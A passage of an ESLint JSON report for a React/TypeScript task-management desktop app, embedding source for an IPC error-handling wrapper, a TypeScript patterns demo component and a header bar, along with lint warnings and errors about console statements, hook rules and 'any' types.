 isHealthy: boolean;\n  isRetrying: boolean;\n  canRetry: boolean;\n  connectionErrors: number;\n  onRetry: () => void;\n  onDismiss?: () => void;\n  gracefulDegradation?: boolean;\n  children?: ReactNode;\n}\n\n/**\n * Default fallback UI component for IPC errors\n */\nfunction IPCFallbackUI({\n  error,\n  isAvailable,\n  isHealthy,\n  isRetrying,\n  canRetry,\n  connectionErrors,\n  onRetry,\n  onDismiss,\n  gracefulDegradation = false,\n  children\n}: IPCFallbackUIProps) {\n  const getErrorMessage = () => {\n    if (!isAvailable) {\n      return {\n        title: 'Desktop Features Unavailable',\n        message: 'This feature requires the TaskMaster desktop application. Some functionality may be limited in browser mode.',\n        type: 'unavailable' as const\n      };\n    }\n    \n    if (!isHealthy) {\n      return {\n        title: 'Connection Issues',\n        message: 'There seems to be a problem with the application connection. Please try refreshing or restarting the app.',\n        type: 'unhealthy' as const\n      };\n    }\n\n    return {\n      title: 'Service Error',\n      message: error || 'An unknown error occurred while communicating with the application.',\n      type: 'error' as const\n    };\n  };\n\n  const { title, message, type } = getErrorMessage();\n  const showAsWarning = gracefulDegradation && type === 'unavailable';\n\n  if (showAsWarning) {\n    // Graceful degradation - show warning but allow interaction\n    return (\n      <div className=\"relative\">\n        <motion.div\n          initial={{ opacity: 0, y: -10 }}\n          animate={{ opacity: 1, y: 0 }}\n          exit={{ opacity: 0, y: -10 }}\n          className=\"mb-4 p-3 bg-yellow-50 dark:bg-yellow-900/20 border border-yellow-200 dark:border-yellow-800 rounded-lg\"\n        >\n          <div className=\"flex items-start gap-3\">\n            <Info className=\"w-5 h-5 text-yellow-600 dark:text-yellow-400 mt-0.5 flex-shrink-0\" />\n            <div className=\"flex-1 min-w-0\">\n              <p className=\"text-sm font-medium text-yellow-800 dark:text-yellow-200\">\n                {title}\n              </p>\n              <p className=\"text-sm text-yellow-700 dark:text-yellow-300 mt-1\">\n                {message}\n              </p>\n            </div>\n            {onDismiss && (\n              <button\n                onClick={onDismiss}\n                className=\"text-yellow-400 hover:text-yellow-600 dark:text-yellow-300 dark:hover:text-yellow-100\"\n              >\n                Ã—\n              </button>\n            )}\n          </div>\n        </motion.div>\n        {children}\n      </div>\n    );\n  }\n\n  // Full error state\n  return (\n    <motion.div\n      initial={{ opacity: 0, scale: 0.95 }}\n      animate={{ opacity: 1, scale: 1 }}\n      transition={{ duration: 0.3 }}\n      className=\"flex flex-col items-center justify-center p-8 text-center bg-card rounded-lg border min-h-48\"\n    >\n      <motion.div\n        initial={{ y: -20 }}\n        animate={{ y: 0 }}\n        transition={{ delay: 0.1 }}\n        className=\"mb-6\"\n      >\n        <div className=\"relative\">\n          <motion.div\n            animate={{ rotate: [0, -10, 10, 0] }}\n            transition={{ duration: 2, repeat: Infinity, repeatDelay: 3 }}\n            className=\"w-12 h-12 mx-auto\"\n          >\n            {!isAvailable ? (\n              <WifiOff className=\"w-full h-full text-destructive\" />\n            ) : (\n              <AlertTriangle className=\"w-full h-full text-destructive\" />\n            )}\n          </motion.div>\n        </div>\n      </motion.div>\n\n      <motion.div\n        initial={{ y: 20, opacity: 0 }}\n        animate={{ y: 0, opacity: 1 }}\n        transition={{ delay: 0.2 }}\n        className=\"space-y-4 max-w-md\"\n      >\n        <h3 className=\"text-lg font-semibold text-foreground\">{title}</h3>\n        <p className=\"text-muted-foreground text-sm\">{message}</p>\n\n        {/* Connection error count */}\n        {connectionErrors > 0 && (\n          <p className=\"text-xs text-muted-foreground\">\n            Connection attempts: {connectionErrors}\n          </p>\n        )}\n\n        {/* Error details in development */}\n        {process.env.NODE_ENV === 'development' && error && (\n          <motion.details\n            initial={{ opacity: 0 }}\n            animate={{ opacity: 1 }}\n            transition={{ delay: 0.4 }}\n            className=\"text-left bg-muted/50 rounded-lg p-3 mt-4\"\n          >\n            <summary className=\"cursor-pointer font-medium text-xs mb-2\">\n              Error Details (Development)\n            </summary>\n            <pre className=\"text-xs text-destructive overflow-auto max-h-20 whitespace-pre-wrap\">\n              {error}\n            </pre>\n          </motion.details>\n        )}\n      </motion.div>\n\n      {/* Action buttons */}\n      <motion.div\n        initial={{ y: 20, opacity: 0 }}\n        animate={{ y: 0, opacity: 1 }}\n        transition={{ delay: 0.3 }}\n        className=\"flex gap-3 mt-6\"\n      >\n        {canRetry && (\n          <motion.button\n            whileHover={{ scale: 1.05 }}\n            whileTap={{ scale: 0.95 }}\n            onClick={onRetry}\n            disabled={isRetrying}\n            className=\"inline-flex items-center gap-2 px-4 py-2 bg-primary text-primary-foreground rounded-lg hover:bg-primary/90 transition-colors disabled:opacity-50\"\n          >\n            <RefreshCw className={`w-4 h-4 ${isRetrying ? 'animate-spin' : ''}`} />\n            {isRetrying ? 'Retrying...' : 'Try Again'}\n          </motion.button>\n        )}\n\n        {!isAvailable && (\n          <motion.button\n            whileHover={{ scale: 1.05 }}\n            whileTap={{ scale: 0.95 }}\n            onClick={() => window.location.reload()}\n            className=\"inline-flex items-center gap-2 px-4 py-2 bg-secondary text-secondary-foreground rounded-lg hover:bg-secondary/90 transition-colors\"\n          >\n            <Settings className=\"w-4 h-4\" />\n            Reload App\n          </motion.button>\n        )}\n      </motion.div>\n    </motion.div>\n  );\n}\n\n/**\n * Hook-based HOC for functional components\n */\nexport function withIPCErrorHandling<P extends object>(\n  WrappedComponent: ComponentType<P>,\n  options: WithIPCErrorHandlingProps = {}\n) {\n  const {\n    fallbackComponent,\n    requiresIPC = true,\n    gracefulDegradation = false,\n    retryable = true,\n    showConnectionStatus = false,\n    onIPCError,\n    onConnectionLost,\n    onConnectionRestored\n  } = options;\n\n  const ComponentWithIPCErrorHandling = (props: P) => {\n    const ipc = requiresIPC ? useRequireIPC() : useIPC();\n    const [showFallback, setShowFallback] = useState(false);\n    const [isRetrying, setIsRetrying] = useState(false);\n    const [dismissedWarning, setDismissedWarning] = useState(false);\n\n    // Handle connection state changes\n    useEffect(() => {\n      if (!ipc.isAvailable && requiresIPC && !gracefulDegradation) {\n        setShowFallback(true);\n        onConnectionLost?.();\n      } else if (ipc.isAvailable && showFallback) {\n        setShowFallback(false);\n        onConnectionRestored?.();\n      }\n    }, [ipc.isAvailable, requiresIPC, gracefulDegradation, showFallback]);\n\n    // Handle health changes\n    useEffect(() => {\n      if (requiresIPC && !ipc.isHealthy && ipc.isAvailable) {\n        setShowFallback(true);\n      }\n    }, [ipc.isHealthy, requiresIPC, ipc.isAvailable]);\n\n    // Handle errors\n    useEffect(() => {\n      if (ipc.lastError) {\n        onIPCError?.(ipc.lastError);\n        if (requiresIPC) {\n          setShowFallback(true);\n        }\n      }\n    }, [ipc.lastError, requiresIPC]);\n\n    const handleRetry = async () => {\n      if (!retryable || isRetrying) return;\n      \n      setIsRetrying(true);\n      try {\n        await ipc.refreshStatus();\n        // Small delay to show the retry animation\n        setTimeout(() => {\n          setIsRetrying(false);\n          if (ipc.isHealthy) {\n            setShowFallback(false);\n          }\n        }, 1000);\n      } catch (error) {\n        setIsRetrying(false);\n      }\n    };\n\n    // Show fallback UI if required\n    if (showFallback || (!ipc.isAvailable && requiresIPC && !gracefulDegradation)) {\n      if (fallbackComponent) {\n        return <>{fallbackComponent}</>;\n      }\n\n      return (\n        <IPCFallbackUI\n          error={ipc.lastError || undefined}\n          isAvailable={ipc.isAvailable}\n          isHealthy={ipc.isHealthy}\n          isRetrying={isRetrying}\n          canRetry={retryable}\n          connectionErrors={ipc.connectionErrors}\n          onRetry={handleRetry}\n          gracefulDegradation={gracefulDegradation}\n        />\n      );\n    }\n\n    // Show warning for graceful degradation\n    if (!ipc.isAvailable && gracefulDegradation && !dismissedWarning) {\n      return (\n        <IPCFallbackUI\n          error={ipc.lastError || undefined}\n          isAvailable={ipc.isAvailable}\n          isHealthy={ipc.isHealthy}\n          isRetrying={isRetrying}\n          canRetry={retryable}\n          connectionErrors={ipc.connectionErrors}\n          onRetry={handleRetry}\n          onDismiss={() => setDismissedWarning(true)}\n          gracefulDegradation={true}\n        >\n          <WrappedComponent {...props} />\n        </IPCFallbackUI>\n      );\n    }\n\n    // Connection status indicator\n    if (showConnectionStatus && !ipc.isHealthy) {\n      return (\n        <div className=\"relative\">\n          <motion.div\n            initial={{ opacity: 0, x: 20 }}\n            animate={{ opacity: 1, x: 0 }}\n            className=\"fixed top-4 right-4 z-50 bg-destructive text-destructive-foreground px-3 py-2 rounded-lg shadow-lg text-sm flex items-center gap-2\"\n          >\n            <WifiOff className=\"w-4 h-4\" />\n            Connection Issues\n            {retryable && (\n              <button\n                onClick={handleRetry}\n                disabled={isRetrying}\n                className=\"ml-2 text-xs underline hover:no-underline\"\n              >\n                {isRetrying ? 'Retrying...' : 'Retry'}\n              </button>\n            )}\n          </motion.div>\n          <WrappedComponent {...props} />\n        </div>\n      );\n    }\n\n    // Normal rendering\n    return <WrappedComponent {...props} />;\n  };\n\n  ComponentWithIPCErrorHandling.displayName = \n    `withIPCErrorHandling(${WrappedComponent.displayName || WrappedComponent.name})`;\n\n  return ComponentWithIPCErrorHandling;\n}\n\n/**\n * Hook for components that need IPC error handling\n */\nexport function useIPCErrorHandling(options: WithIPCErrorHandlingProps = {}) {\n  const {\n    requiresIPC = true,\n    gracefulDegradation = false,\n    onIPCError,\n    onConnectionLost,\n    onConnectionRestored\n  } = options;\n\n  const ipc = requiresIPC ? useRequireIPC() : useIPC();\n  const safeIPC = useSafeIPC();\n  const [hasError, setHasError] = useState(false);\n\n  // Monitor connection state\n  useEffect(() => {\n    if (!ipc.isAvailable && requiresIPC) {\n      setHasError(true);\n      onConnectionLost?.();\n    } else if (ipc.isAvailable && hasError) {\n      setHasError(false);\n      onConnectionRestored?.();\n    }\n  }, [ipc.isAvailable, requiresIPC, hasError]);\n\n  // Monitor errors\n  useEffect(() => {\n    if (ipc.lastError) {\n      onIPCError?.(ipc.lastError);\n      if (requiresIPC && !gracefulDegradation) {\n        setHasError(true);\n      }\n    }\n  }, [ipc.lastError, requiresIPC, gracefulDegradation]);\n\n  return {\n    ...ipc,\n    safeInvoke: safeIPC.invoke,\n    hasError,\n    canProceed: ipc.isAvailable || gracefulDegradation,\n    shouldShowFallback: hasError && requiresIPC && !gracefulDegradation\n  };\n}\n\nexport default withIPCErrorHandling;","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/components/examples/AdvancedTypesExample.tsx","messages":[{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":38,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":38,"endColumn":16,"suggestions":[{"fix":{"range":[1074,1115],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":44,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":44,"endColumn":16,"suggestions":[{"fix":{"range":[1224,1268],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":50,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":50,"endColumn":16,"suggestions":[{"fix":{"range":[1419,1463],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"react-refresh/only-export-components","severity":1,"message":"Fast refresh only works when a file only exports components. Move your component(s) to a separate file.","line":58,"column":7,"nodeType":"Identifier","messageId":"localComponents","endLine":61,"endColumn":3},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useState\" is called in function \"_AdvancedTypesExample: React.FC\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":96,"column":47,"nodeType":"Identifier","endLine":96,"endColumn":55},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useState\" is called in function \"_AdvancedTypesExample: React.FC\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":97,"column":53,"nodeType":"Identifier","endLine":97,"endColumn":61},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useState\" is called in function \"_AdvancedTypesExample: React.FC\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":98,"column":23,"nodeType":"Identifier","endLine":98,"endColumn":31},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useCallback\" is called in function \"_AdvancedTypesExample: React.FC\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":101,"column":22,"nodeType":"Identifier","endLine":101,"endColumn":33},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":108,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":108,"endColumn":16,"suggestions":[{"fix":{"range":[3327,3366],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useCallback\" is called in function \"_AdvancedTypesExample: React.FC\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":113,"column":28,"nodeType":"Identifier","endLine":113,"endColumn":39},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":125,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":125,"endColumn":18,"suggestions":[{"fix":{"range":[3872,3909],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":127,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":127,"endColumn":20,"suggestions":[{"fix":{"range":[3938,3985],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]}],"suppressedMessages":[],"errorCount":5,"fatalErrorCount":0,"warningCount":7,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Example component demonstrating advanced TypeScript 5.8 patterns\n * This showcases practical usage of const contexts for template literals\n * and other cutting-edge TypeScript features for 2025\n */\n\nimport React, { useState, useCallback } from 'react';\nimport { motion } from 'framer-motion';\nimport { \n  API_ENDPOINTS,\n  THEME_CONFIG,\n  STATUS_CONFIG,\n  APP_CONFIG,\n  createTaskId,\n  createProjectId,\n  TypeSafeQueryBuilder,\n  type TaskId,\n  type ProjectId,\n} from '@/lib/advanced-types';\n\n// Type-safe API client using template literals and const contexts\nclass TypeSafeAPIClient {\n  private baseUrl: string;\n\n  constructor() {\n    this.baseUrl = APP_CONFIG.api.baseUrl;\n  }\n\n  // Template literal method for type-safe endpoint building\n  private buildUrl<T extends string>(endpoint: T): `${string}/${T}` {\n    return `${this.baseUrl}/${endpoint}` as const;\n  }\n\n  // Type-safe methods using const assertion patterns\n  async getTasks() {\n    const url = this.buildUrl(API_ENDPOINTS.tasks.list);\n    // In real implementation, this would make an actual API call\n    console.log('Fetching tasks from:', url);\n    return [];\n  }\n\n  async getProjects() {\n    const url = this.buildUrl(API_ENDPOINTS.projects.list);\n    console.log('Fetching projects from:', url);\n    return [];\n  }\n\n  async createTask(data: { title: string; description: string }) {\n    const url = this.buildUrl(API_ENDPOINTS.tasks.create);\n    console.log('Creating task at:', url, data);\n    return { id: createTaskId('task-123'), ...data };\n  }\n}\n\n// Remove unused form field configuration for now to focus on working examples\n\n// Status badge component using const context patterns\nconst StatusBadge: React.FC<{\n  status: string;\n  type: 'task' | 'project';\n}> = ({ status, type }) => {\n  // Type-safe access to status configurations\n  if (type === 'task') {\n    const config = STATUS_CONFIG.task[status as keyof typeof STATUS_CONFIG.task];\n    if (!config) return null;\n    \n    return (\n      <motion.span\n        initial={{ scale: 0.8, opacity: 0 }}\n        animate={{ scale: 1, opacity: 1 }}\n        className={`inline-flex items-center gap-1 px-2 py-1 rounded-full text-xs font-medium ${config.color} bg-current/10`}\n      >\n        <span>{config.icon}</span>\n        {config.label}\n      </motion.span>\n    );\n  } else {\n    const config = STATUS_CONFIG.project[status as keyof typeof STATUS_CONFIG.project];\n    if (!config) return null;\n    \n    return (\n      <motion.span\n        initial={{ scale: 0.8, opacity: 0 }}\n        animate={{ scale: 1, opacity: 1 }}\n        className={`inline-flex items-center gap-1 px-2 py-1 rounded-full text-xs font-medium ${config.color} bg-current/10`}\n      >\n        <span>{config.icon}</span>\n        {config.label}\n      </motion.span>\n    );\n  }\n};\n\n// Main example component\nexport const _AdvancedTypesExample: React.FC = () => {\n  const [selectedTaskId, setSelectedTaskId] = useState<TaskId | null>(null);\n  const [selectedProjectId, setSelectedProjectId] = useState<ProjectId | null>(null);\n  const [apiClient] = useState(() => new TypeSafeAPIClient());\n\n  // Demonstrate type-safe query building\n  const buildQuery = useCallback(() => {\n    const query = new TypeSafeQueryBuilder()\n      .select('id, title, status')\n      .from('tasks')\n      .where('priority = \"high\"')\n      .build();\n    \n    console.log('Generated query:', query);\n    return query;\n  }, []);\n\n  // Demonstrate branded type creation\n  const handleCreateTask = useCallback(async () => {\n    const taskId = createTaskId(`task-${Date.now()}`);\n    const projectId = createProjectId(`project-${Date.now()}`);\n    \n    setSelectedTaskId(taskId);\n    setSelectedProjectId(projectId);\n    \n    try {\n      const result = await apiClient.createTask({\n        title: 'New Advanced Task',\n        description: 'This task demonstrates advanced TypeScript patterns'\n      });\n      console.log('Created task:', result);\n    } catch (error) {\n      console.error('Failed to create task:', error);\n    }\n  }, [apiClient]);\n\n  return (\n    <motion.div\n      initial={{ opacity: 0, y: 20 }}\n      animate={{ opacity: 1, y: 0 }}\n      className=\"max-w-4xl mx-auto p-6 space-y-6\"\n    >\n      <div className=\"bg-card rounded-lg border p-6\">\n        <h2 className=\"text-2xl font-bold mb-4\">Advanced TypeScript 5.8 Patterns Demo</h2>\n        <p className=\"text-muted-foreground mb-6\">\n          This component demonstrates cutting-edge TypeScript patterns including const contexts \n          for template literals, branded types, and type-safe configurations.\n        </p>\n\n        {/* Status Examples */}\n        <div className=\"space-y-4\">\n          <h3 className=\"text-lg font-semibold\">Type-Safe Status System</h3>\n          <div className=\"flex flex-wrap gap-2\">\n            <StatusBadge status=\"pending\" type=\"task\" />\n            <StatusBadge status=\"inProgress\" type=\"task\" />\n            <StatusBadge status=\"completed\" type=\"task\" />\n            <StatusBadge status=\"active\" type=\"project\" />\n            <StatusBadge status=\"paused\" type=\"project\" />\n            <StatusBadge status=\"archived\" type=\"project\" />\n          </div>\n        </div>\n\n        {/* API Endpoints Demo */}\n        <div className=\"space-y-4\">\n          <h3 className=\"text-lg font-semibold\">Type-Safe API Endpoints</h3>\n          <div className=\"bg-muted rounded p-4 font-mono text-sm\">\n            <div>Tasks List: {API_ENDPOINTS.tasks.list}</div>\n            <div>Tasks Create: {API_ENDPOINTS.tasks.create}</div>\n            <div>Projects List: {API_ENDPOINTS.projects.list}</div>\n            <div>Projects Create: {API_ENDPOINTS.projects.create}</div>\n          </div>\n        </div>\n\n        {/* Theme Configuration Demo */}\n        <div className=\"space-y-4\">\n          <h3 className=\"text-lg font-semibold\">Type-Safe Theme Configuration</h3>\n          <div className=\"grid grid-cols-2 gap-4\">\n            <div className=\"space-y-2\">\n              <div className=\"text-sm font-medium\">Primary Colors</div>\n              <div className=\"flex gap-2\">\n                {Object.entries(THEME_CONFIG.colors.primary).map(([shade, color]) => (\n                  <div\n                    key={shade}\n                    className=\"w-8 h-8 rounded border\"\n                    style={{ backgroundColor: color }}\n                    title={`primary-${shade}: ${color}`}\n                  />\n                ))}\n              </div>\n            </div>\n            <div className=\"space-y-2\">\n              <div className=\"text-sm font-medium\">Spacing Scale</div>\n              <div className=\"space-y-1\">\n                {Object.entries(THEME_CONFIG.spacing).map(([size, value]) => (\n                  <div key={size} className=\"text-xs font-mono\">\n                    {size}: {value}\n                  </div>\n                ))}\n              </div>\n            </div>\n          </div>\n        </div>\n\n        {/* Interactive Demo */}\n        <div className=\"space-y-4\">\n          <h3 className=\"text-lg font-semibold\">Interactive Demo</h3>\n          <div className=\"flex gap-4\">\n            <motion.button\n              whileHover={{ scale: 1.05 }}\n              whileTap={{ scale: 0.95 }}\n              onClick={handleCreateTask}\n              className=\"px-4 py-2 bg-primary text-primary-foreground rounded-lg hover:bg-primary/90 transition-colors\"\n            >\n              Create Task (Branded Types)\n            </motion.button>\n            \n            <motion.button\n              whileHover={{ scale: 1.05 }}\n              whileTap={{ scale: 0.95 }}\n              onClick={buildQuery}\n              className=\"px-4 py-2 bg-secondary text-secondary-foreground rounded-lg hover:bg-secondary/90 transition-colors\"\n            >\n              Build Type-Safe Query\n            </motion.button>\n          </div>\n\n          {selectedTaskId && (\n            <motion.div\n              initial={{ opacity: 0, y: 10 }}\n              animate={{ opacity: 1, y: 0 }}\n              className=\"p-4 bg-green-50 border border-green-200 rounded-lg\"\n            >\n              <div className=\"text-sm\">\n                <strong>Selected Task ID (Branded):</strong> <code>{selectedTaskId}</code>\n              </div>\n            </motion.div>\n          )}\n\n          {selectedProjectId && (\n            <motion.div\n              initial={{ opacity: 0, y: 10 }}\n              animate={{ opacity: 1, y: 0 }}\n              className=\"p-4 bg-blue-50 border border-blue-200 rounded-lg\"\n            >\n              <div className=\"text-sm\">\n                <strong>Selected Project ID (Branded):</strong> <code>{selectedProjectId}</code>\n              </div>\n            </motion.div>\n          )}\n        </div>\n\n        {/* Configuration Display */}\n        <div className=\"space-y-4\">\n          <h3 className=\"text-lg font-semibold\">App Configuration (Const Context)</h3>\n          <div className=\"bg-muted rounded p-4\">\n            <pre className=\"text-xs overflow-auto\">\n              {JSON.stringify(APP_CONFIG, null, 2)}\n            </pre>\n          </div>\n        </div>\n      </div>\n    </motion.div>\n  );\n};\n\nexport default _AdvancedTypesExample;","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/components/layout/Header.tsx","messages":[{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":100,"column":13,"nodeType":"MemberExpression","messageId":"unexpected","endLine":100,"endColumn":26,"suggestions":[{"fix":{"range":[2629,2676],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":126,"column":65,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":126,"endColumn":68,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[3529,3532],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[3529,3532],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":2,"fixableErrorCount":0,"fixableWarningCount":0,"source":"import { motion } from 'framer-motion'\nimport { \n  Search, \n  Filter, \n  SortAsc, \n \n  MoreHorizontal,\n  Bell,\n  User,\n  Command,\n  Download,\n  Upload,\n  Grid3X3,\n  List,\n  Calendar,\n  BarChart3,\n  Clock\n} from 'lucide-react'\nimport { useTaskStore } from '@/store/useTaskStore'\nimport { cn } from '@/lib/utils'\n\nconst _ViewTypeButton = ({ \n  icon: Icon, \n  label, \n  isActive, \n  onClick \n}: {\n  icon: React.ComponentType<{ className?: string }>\n  label: string\n  isActive: boolean\n  onClick: () => void\n}) => (\n  <motion.button\n    onClick={onClick}\n    className={cn(\n      \"flex items-center space-x-2 px-3 py-2 rounded-lg transition-all duration-200\",\n      \"hover:bg-accent/50 relative overflow-hidden\",\n      isActive && \"bg-accent text-accent-foreground shadow-sm\"\n    )}\n    whileHover={{ scale: 1.02 }}\n    whileTap={{ scale: 0.98 }}\n  >\n    <Icon className=\"w-4 h-4\" />\n    <span className=\"text-sm font-medium\">{label}</span>\n    {isActive && (\n      <motion.div\n        layoutId=\"activeViewIndicator\"\n        className=\"absolute inset-0 bg-gradient-to-r from-blue-500/10 to-purple-500/10 rounded-lg\"\n        transition={{ type: \"spring\", stiffness: 400, damping: 30 }}\n      />\n    )}\n  </motion.button>\n)\n\nexport function Header() {\n  const { \n    viewMode, \n    setViewMode, \n    analytics,\n    searchQuery,\n    setSearchQuery,\n    exportToJSON,\n    loadFromJSON\n  } = useTaskStore()\n\n  const viewTypes = [\n    { type: 'list', icon: List, label: 'List' },\n    { type: 'kanban', icon: Grid3X3, label: 'Kanban' },\n    { type: 'calendar', icon: Calendar, label: 'Calendar' },\n    { type: 'timeline', icon: Clock, label: 'Timeline' },\n    { type: 'analytics', icon: BarChart3, label: 'Analytics' }\n  ]\n\n  const handleExport = () => {\n    const data = exportToJSON()\n    const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' })\n    const url = URL.createObjectURL(blob)\n    const a = document.createElement('a')\n    a.href = url\n    a.download = `taskmaster-export-${new Date().toISOString().split('T')[0]}.json`\n    document.body.appendChild(a)\n    a.click()\n    document.body.removeChild(a)\n    URL.revokeObjectURL(url)\n  }\n\n  const handleImport = () => {\n    const input = document.createElement('input')\n    input.type = 'file'\n    input.accept = '.json'\n    input.onchange = (e) => {\n      const file = (e.target as HTMLInputElement).files?.[0]\n      if (file) {\n        const reader = new FileReader()\n        reader.onload = (e) => {\n          try {\n            const data = JSON.parse(e.target?.result as string)\n            loadFromJSON(data)\n          } catch (error) {\n            console.error('Failed to import tasks:', error)\n          }\n        }\n        reader.readAsText(file)\n      }\n    }\n    input.click()\n  }\n\n  return (\n    <motion.header \n      className=\"border-b border-border/50 bg-background/95 backdrop-blur-xl\"\n      initial={{ y: -20, opacity: 0 }}\n      animate={{ y: 0, opacity: 1 }}\n      transition={{ duration: 0.3 }}\n    >\n      <div className=\"flex items-center justify-between p-4\">\n        {/* Left section - View switcher */}\n        <div className=\"flex items-center space-x-4\">\n          <div className=\"flex items-center space-x-2 p-1 bg-muted/30 rounded-lg\">\n            {viewTypes.map((view) => (\n              <_ViewTypeButton\n                key={view.type}\n                icon={view.icon}\n                label={view.label}\n                isActive={viewMode.type === view.type}\n                onClick={() => setViewMode({ type: view.type as any })}\n              />\n            ))}\n          </div>\n\n          {/* Quick stats */}\n          <div className=\"flex items-center space-x-4 text-sm text-muted-foreground\">\n            <div className=\"flex items-center space-x-1\">\n              <div className=\"w-2 h-2 bg-emerald-500 rounded-full animate-pulse-soft\"></div>\n              <span>{analytics.completedTasks} completed</span>\n            </div>\n            <div className=\"flex items-center space-x-1\">\n              <div className=\"w-2 h-2 bg-blue-500 rounded-full animate-pulse-soft\"></div>\n              <span>{analytics.inProgressTasks} in progress</span>\n            </div>\n            <div className=\"flex items-center space-x-1\">\n              <div className=\"w-2 h-2 bg-gray-400 rounded-full\"></div>\n              <span>{analytics.pendingTasks} pending</span>\n            </div>\n          </div>\n        </div>\n\n        {/* Center section - Search */}\n        <div className=\"flex-1 max-w-md mx-8\">\n          <motion.div \n            className=\"relative\"\n            whileFocus={{ scale: 1.02 }}\n          >\n            <Search className=\"w-4 h-4 absolute left-3 top-1/2 transform -translate-y-1/2 text-muted-foreground\" />\n            <Command className=\"w-4 h-4 absolute right-3 top-1/2 transform -translate-y-1/2 text-muted-foreground\" />\n            <input\n              type=\"text\"\n              placeholder=\"Search tasks or press âŒ˜K for commands...\"\n              value={searchQuery}\n              onChange={(e) => setSearchQuery(e.target.value)}\n              className={cn(\n                \"w-full pl-10 pr-10 py-3 rounded-xl border border-border/50\",\n                \"bg-background/50 backdrop-blur-sm\",\n                \"focus:outline-none focus:ring-2 focus:ring-primary/20 focus:border-primary/50\",\n                \"transition-all duration-200\",\n                \"placeholder:text-muted-foreground\"\n              )}\n            />\n          </motion.div>\n        </div>\n\n        {/* Right section - Actions */}\n        <div className=\"flex items-center space-x-3\">\n          {/* View options */}\n          <div className=\"flex items-center space-x-2\">\n            <motion.button\n              className=\"p-2 rounded-lg hover:bg-accent/50 transition-colors\"\n              whileHover={{ scale: 1.05 }}\n              whileTap={{ scale: 0.95 }}\n              title=\"Sort ascending\"\n            >\n              <SortAsc className=\"w-4 h-4\" />\n            </motion.button>\n            \n            <motion.button\n              className=\"p-2 rounded-lg hover:bg-accent/50 transition-colors\"\n              whileHover={{ scale: 1.05 }}\n              whileTap={{ scale: 0.95 }}\n              title=\"Filter tasks\"\n            >\n              <Filter className=\"w-4 h-4\" />\n            </motion.button>\n          </div>\n\n          {/* Divider */}\n          <div className=\"w-px h-6 bg-border/50\"></div>\n\n          {/* Import/Export */}\n          <div className=\"flex items-center space-x-2\">\n            <motion.button\n              onClick={handleImport}\n              className=\"p-2 rounded-lg hover:bg-accent/50 transition-colors\"\n              whileHover={{ scale: 1.05 }}\n              whileTap={{ scale: 0.95 }}\n              title=\"Import tasks\"\n            >\n              <Upload className=\"w-4 h-4\" />\n            </motion.button>\n            \n            <motion.button\n              onClick={handleExport}\n              className=\"p-2 rounded-lg hover:bg-accent/50 transition-colors\"\n              whileHover={{ scale: 1.05 }}\n              whileTap={{ scale: 0.95 }}\n              title=\"Export tasks\"\n            >\n              <Download className=\"w-4 h-4\" />\n            </motion.button>\n          </div>\n\n          {/* Divider */}\n          <div className=\"w-px h-6 bg-border/50\"></div>\n\n          {/* Notifications */}\n          <motion.button\n            className=\"relative p-2 rounded-lg hover:bg-accent/50 transition-colors\"\n            whileHover={{ scale: 1.05 }}\n            whileTap={{ scale: 0.95 }}\n          >\n            <Bell className=\"w-4 h-4\" />\n            <div className=\"absolute -top-1 -right-1 w-3 h-3 bg-red-500 rounded-full animate-bounce-subtle\">\n              <div className=\"w-full h-full bg-red-500 rounded-full animate-ping\"></div>\n            </div>\n          </motion.button>\n\n          {/* Profile */}\n          <motion.button\n            className=\"flex items-center space-x-2 p-2 rounded-lg hover:bg-accent/50 transition-colors\"\n            whileHover={{ 